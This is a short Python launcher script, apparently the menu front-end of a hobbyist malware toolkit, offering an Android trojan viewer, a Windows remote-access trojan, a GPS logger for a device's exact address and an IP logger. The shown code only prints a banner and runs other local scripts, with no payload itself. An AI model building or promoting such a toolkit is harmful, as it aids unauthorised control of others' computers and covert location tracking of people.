import os
import subprocess
RED = "\033[91m"
RESET = "\033[0m"
ascii_art = r"""
 ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░      ░▒▓████████▓▒░▒▓████████▓▒░▒▓███████▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░
 ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░      ░▒▓████████▓▒░▒▓████████▓▒░▒▓███████▓▒░
"""
menu = """
Coded by: Void
-----------------------------------------------
1: ATV (Android Trojan Viewer.)
2: WKLV (Windows RAT, Send commands to windows PC/LAPTOP.)
3: GPS Logger. (Get the exact address of the device.)
4: IP Logger.
---------------------------------------------------
"""
def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(RED + ascii_art + RESET)
    print(RED + menu + RESET)

    choice = input(RED + "Select an option (1-4): " + RESET).strip()

    if choice == "1":
        subprocess.run(["python3", "atv.py"])
    elif choice == "2":
        subprocess.run(["python3", "wtv.py"])
    elif choice == "3":
        subprocess.run(["python3", "gps.py"])
    elif choice == "4":
        print(RED + "Changing this due to gps logger also logging the public ip too." + RESET)
    else:
        print(RED + "Invalid choice." + RESET)

if __name__ == "__main__":
    main()
